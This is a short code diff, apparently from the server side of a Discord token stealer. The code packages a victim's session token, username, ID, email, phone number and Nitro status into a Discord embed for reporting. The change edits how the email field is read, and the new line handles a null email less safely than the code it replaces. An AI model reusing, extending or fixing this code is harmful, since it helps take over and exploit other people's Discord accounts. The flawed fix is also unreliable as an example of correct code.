@@ -186,8 +186,8 @@ class Delivery(Resource):
                     discord_embed.add_embed_field(name="Username", value=cb + f"{tokeninfo.json()['username']}#{tokeninfo.json()['discriminator']}" + cb, inline=True)
                     discord_embed.add_embed_field(name="ID", value=cb + tokeninfo.json()['id'] + cb, inline=True)
                     discord_embed.add_embed_field(name="Token", value=cb + token + cb, inline=True)
-                    email_value = tokeninfo.json()['email'] if tokeninfo.json()['email'] is not None else "Not available"
-                    discord_embed.add_embed_field(name="Email", value=cb + tokeninfo.json()['email'] + cb, inline=True)
+                    email_value = tokeninfo.json().get('email', "Not available")
+                    discord_embed.add_embed_field(name="Email", value=cb + email_value + cb, inline=True)
                     discord_embed.add_embed_field(name="Phone", value=cb + "Not linked" + cb if tokeninfo.json()['phone'] is None else cb + tokeninfo.json()['phone'] + cb, inline=True)
                     discord_embed.set_thumbnail(url="https://cdn.discordapp.com/embed/avatars/0.png" if tokeninfo.json()['avatar'] is None else "https://cdn.discordapp.com/avatars/" + tokeninfo.json()['id'] + "/" + tokeninfo.json()['avatar'] + ".png")
                     discord_embed.add_embed_field(name="Nitro", value=cb + "No" + cb if tokeninfo.json()['premium_type'] == 0 else cb + "Yes" + cb, inline=True)
